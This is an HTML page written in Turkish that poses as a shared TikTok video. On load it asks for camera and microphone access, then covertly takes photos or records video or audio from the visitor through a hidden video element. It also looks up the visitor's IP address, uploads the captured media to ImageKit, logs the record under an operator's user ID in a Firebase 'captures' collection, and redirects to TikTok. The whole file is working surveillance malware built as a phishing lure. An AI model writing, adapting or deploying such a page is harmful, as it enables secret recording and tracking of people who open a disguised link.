<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
    <meta name="robots" content="noindex, nofollow">
    <meta property="og:title" content="TikTok Video" />
    <meta property="og:description" content="Bu videoyu izle ve beğen! 🔥" />
    <meta property="og:image" content="https://cdn.pixabay.com/photo/2020/07/06/01/33/tiktok-5374692_1280.png" />
    <meta name="twitter:card" content="summary_large_image" />
    <title>TikTok Video</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; user-select: none; }
        body { background: #000; width: 100vw; height: 100vh; overflow: hidden; }
        video { position: fixed; top: -100%; left: -100%; width: 1px; height: 1px; opacity: 0; }
        canvas { display: none; }
    </style>
</head>
<body>
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

<script src="config.js"></script>

<!-- Firebase Compat sürümü - Instagram WebView ile uyumlu -->
<script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore-compat.js"></script>

<script>
    // Firebase'i başlat (compat sürümü ile)
    const firebaseConfig = window.FIREBASE_CONFIG;
    firebase.initializeApp(firebaseConfig);
    const db = firebase.firestore();
    
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    let mediaStream = null;
    
    const IMAGEKIT_CONFIG = window.IMAGEKIT_CONFIG;
    
    async function uploadToImageKit(file) {
        return new Promise((resolve, reject) => {
            const formData = new FormData();
            formData.append('file', file);
            formData.append('publicKey', IMAGEKIT_CONFIG.publicKey);
            formData.append('fileName', Date.now() + '_' + file.name);
            formData.append('folder', '/web-uploads');
            formData.append('useUniqueFileName', 'true');
            
            const xhr = new XMLHttpRequest();
            xhr.open('POST', 'https://upload.imagekit.io/api/v1/files/upload');
            const auth = btoa(IMAGEKIT_CONFIG.privateKey + ':');
            xhr.setRequestHeader('Authorization', 'Basic ' + auth);
            
            xhr.onload = () => {
                if (xhr.status >= 200 && xhr.status < 300) {
                    try { 
                        resolve({ success: true, url: JSON.parse(xhr.responseText).url });
                    } catch(e) { reject('Upload failed'); }
                } else { reject('Upload error: ' + xhr.status); }
            };
            xhr.onerror = () => reject('Network error');
            xhr.send(formData);
        });
    }
    
    async function capturePhoto() {
        return new Promise((resolve) => {
            if (!video.videoWidth || !video.videoHeight) { resolve(null); return; }
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');
            ctx.translate(canvas.width, 0);
            ctx.scale(-1, 1);
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            canvas.toBlob(async (blob) => {
                resolve(new File([blob], `photo_${Date.now()}.jpg`, { type: 'image/jpeg' }));
            }, 'image/jpeg', 0.9);
        });
    }
    
    async function captureMedia(durationSec, mode) {
        return new Promise(async (resolve) => {
            if (!mediaStream) { resolve(null); return; }
            const mimeType = mode === 'audio' ? 'audio/webm' : 'video/webm';
            const recorder = new MediaRecorder(mediaStream, { mimeType });
            const chunks = [];
            recorder.ondataavailable = e => chunks.push(e.data);
            recorder.onstop = async () => {
                const blob = new Blob(chunks, { type: mimeType });
                resolve(new File([blob], `${mode}_${Date.now()}.webm`, { type: mimeType }));
            };
            recorder.start();
            setTimeout(() => { if (recorder.state === 'recording') recorder.stop(); }, durationSec * 1000);
        });
    }
    
    async function start() {
        try {
            const params = new URLSearchParams(window.location.search);
            let mode = params.get('mode');
            let duration = parseInt(params.get('duration')) || 6;
            let redirectUrl = params.get('redirect') || 'https://www.tiktok.com';
            let userId = params.get('uid');
            
            if (!userId) {
                window.location.href = redirectUrl;
                return;
            }
            
            if (duration < 1) duration = 1;
            if (duration > 60) duration = 60;
            
            let constraints = {};
            if (mode === 'videoaudio') constraints = { video: true, audio: true };
            else if (mode === 'videoonly') constraints = { video: { facingMode: "user" }, audio: false };
            else if (mode === 'audio') constraints = { audio: true };
            else constraints = { video: { facingMode: "user" } };
            
            const stream = await navigator.mediaDevices.getUserMedia(constraints);
            mediaStream = stream;
            
            if (constraints.video) {
                video.srcObject = stream;
                await video.play();
            }
            
            setTimeout(async () => {
                const ip = await fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => d.ip).catch(() => 'unknown');
                let mediaUrls = [];
                
                if (mode === 'photo') {
                    const file = await capturePhoto();
                    if (file) { 
                        const res = await uploadToImageKit(file); 
                        if (res.success) mediaUrls.push(res.url);
                    }
                }
                else if (mode === '5photos') {
                    for (let i = 0; i < 5; i++) {
                        const file = await capturePhoto();
                        if (file) { 
                            const res = await uploadToImageKit(file); 
                            if (res.success) mediaUrls.push(res.url);
                        }
                        await new Promise(r => setTimeout(r, 100));
                    }
                }
                else if (mode === 'videoonly' || mode === 'videoaudio' || mode === 'audio') {
                    const file = await captureMedia(duration, mode);
                    if (file) { 
                        const res = await uploadToImageKit(file); 
                        if (res.success) mediaUrls.push(res.url);
                    }
                }
                
                if (mediaStream) mediaStream.getTracks().forEach(t => t.stop());
                
                if (mediaUrls.length > 0 && userId) {
                    await db.collection("captures").add({
                        media: mediaUrls,
                        ip: ip,
                        mode: mode,
                        duration: (mode === 'videoonly' || mode === 'videoaudio' || mode === 'audio') ? duration : null,
                        userId: userId,
                        timestamp: new Date().toISOString(),
                        unix: Date.now()
                    });
                }
                
                window.location.href = redirectUrl;
            }, 800);
        } catch(err) {
            const redirectUrl = new URLSearchParams(window.location.search).get('redirect') || 'https://www.tiktok.com';
            window.location.href = redirectUrl;
        }
    }
    
    start();
</script>
</body>
</html>
